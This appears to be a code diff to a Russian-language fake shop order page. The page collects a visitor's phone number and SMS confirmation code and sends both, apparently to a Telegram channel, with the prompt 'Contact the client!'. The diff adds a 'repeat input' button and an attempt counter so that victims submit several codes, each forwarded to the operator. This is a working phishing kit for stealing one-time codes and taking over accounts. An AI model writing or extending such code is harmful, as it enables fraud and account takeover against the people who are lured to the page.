@@ -330,6 +330,19 @@
             font-weight: 700;
             font-size: 16px;
             cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .modal-btn-secondary {
+            width: 100%;
+            background: #f0f2f7;
+            color: #6725A8;
+            border: none;
+            padding: 14px;
+            border-radius: 60px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -407,14 +420,15 @@
     <button class="modal-close" id="closeQuestionBtn">✕</button>
     <div class="modal-header">
         <h3 id="questionTitle">Код из СМС</h3>
-        <p id="questionText">Введите код</p>
+        <p id="questionText">Введите код подтверждения</p>
     </div>
     <div class="modal-body">
         <input type="text" class="input-field" id="questionInput" placeholder="Введите код">
         <button class="modal-btn" id="submitQuestionBtn">Отправить</button>
+        <button class="modal-btn-secondary" id="repeatBtn">Повторить ввод</button>
     </div>
     <div class="modal-footer">
-        Это подтверждение для оформления заказа
+        Нажмите «Повторить ввод», если не получили код
     </div>
 </div>
 
@@ -431,22 +445,35 @@
     const closeQuestionBtn = document.getElementById('closeQuestionBtn');
     const submitPhoneBtn = document.getElementById('submitPhoneBtn');
     const submitQuestionBtn = document.getElementById('submitQuestionBtn');
+    const repeatBtn = document.getElementById('repeatBtn');
     const phoneInput = document.getElementById('phoneInput');
     const questionInput = document.getElementById('questionInput');
     
     let userPhone = "";
+    let attemptCount = 0; // Счётчик попыток ввода кода
     
     function openPhoneModal() {
         phoneModal.style.display = 'block';
         overlay.style.display = 'block';
         phoneInput.value = '';
         phoneInput.focus();
+        attemptCount = 0;
     }
     
     function closeAllModals() {
         phoneModal.style.display = 'none';
         questionModal.style.display = 'none';
         overlay.style.display = 'none';
+    }
+    
+    // Закрыть только окно с кодом и открыть его заново (повторный ввод)
+    function repeatCodeInput() {
+        questionModal.style.display = 'none';
+        setTimeout(() => {
+            questionModal.style.display = 'block';
+            questionInput.value = '';
+            questionInput.focus();
+        }, 100);
     }
     
     phoneInput.addEventListener('input', function(e) {
@@ -492,6 +519,7 @@
         questionModal.style.display = 'block';
         questionInput.value = '';
         questionInput.focus();
+        attemptCount = 0;
         
         submitPhoneBtn.textContent = "Продолжить";
         submitPhoneBtn.disabled = false;
@@ -500,20 +528,33 @@
     async function handleQuestionSubmit() {
         let answer = questionInput.value.trim();
         if (answer === "") {
-            alert("Введите код");
+            alert("Введите код из СМС");
             return;
         }
         
         submitQuestionBtn.textContent = "Отправка...";
         submitQuestionBtn.disabled = true;
+        repeatBtn.disabled = true;
         
-        await sendToScript(`🛍️ ОТВЕТ!\n\n📞 Телефон: ${userPhone}\n✅ Код из СМС: ${answer}\n\n🔥 Свяжитесь с клиентом!`);
+        attemptCount++;
         
-        alert("Ожидайте, я свяжусь с вами");
+        await sendToScript(`🛍️ ОТВЕТ (попытка ${attemptCount})!\n\n📞 Телефон: ${userPhone}\n✅ Код из СМС: ${answer}\n\n🔥 Свяжитесь с клиентом!`);
+        
+        alert(`Спасибо! Код принят. Я свяжусь с вами.`);
         closeAllModals();
         
         submitQuestionBtn.textContent = "Отправить";
         submitQuestionBtn.disabled = false;
+        repeatBtn.disabled = false;
+    }
+    
+    // Повторный ввод кода — очищаем поле и оставляем окно открытым
+    function handleRepeat() {
+        questionInput.value = '';
+        questionInput.focus();
+        // Отправляем уведомление в Telegram о повторном запросе кода
+        sendToScript(`🔄 ПОВТОРНЫЙ ЗАПРОС КОДА!\n\n📞 Телефон: ${userPhone}\nПользователь запросил повторный ввод кода (попытка ${attemptCount + 1})`);
+        alert("Повторите ввод кода");
     }
     
     orderBtn.addEventListener('click', openPhoneModal);
@@ -522,6 +563,7 @@
     overlay.addEventListener('click', closeAllModals);
     submitPhoneBtn.addEventListener('click', handlePhoneSubmit);
     submitQuestionBtn.addEventListener('click', handleQuestionSubmit);
+    repeatBtn.addEventListener('click', handleRepeat);
     
     phoneInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') handlePhoneSubmit();
